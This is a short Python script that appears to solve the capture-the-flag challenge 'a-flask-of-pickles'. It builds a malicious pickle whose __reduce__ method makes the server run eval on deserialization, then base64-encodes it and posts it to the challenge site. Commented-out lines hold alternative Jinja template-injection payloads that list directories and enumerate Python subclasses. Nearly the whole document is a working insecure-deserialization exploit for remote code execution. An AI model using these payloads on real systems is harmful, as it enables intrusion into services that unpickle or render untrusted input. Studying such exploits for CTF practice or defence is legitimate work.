import pickle
import requests
import base64
url = "https://a-flask-of-pickles.litctf.live/"


class Exploit():
    def __reduce__(self):
        from flask import render_template_string
        # return render_template_string, ("{{url_for.__globals__.current_app.__dict__.listdir('./')}}",)
        # return render_template_string, ("{{ [].class.base.subclasses() }}",)
        # return render_template_string, ('{{ eval("str(globals())") }}',)
        return eval, ('str(globals())',)


payload = pickle.dumps({'name': '', 'bio': Exploit()})
print(payload, len(payload))
payload_enc = base64.b64encode(payload)
print(payload_enc, len(payload_enc))
resp = requests.post(url + "new", data=payload_enc)
print(url + resp.text)
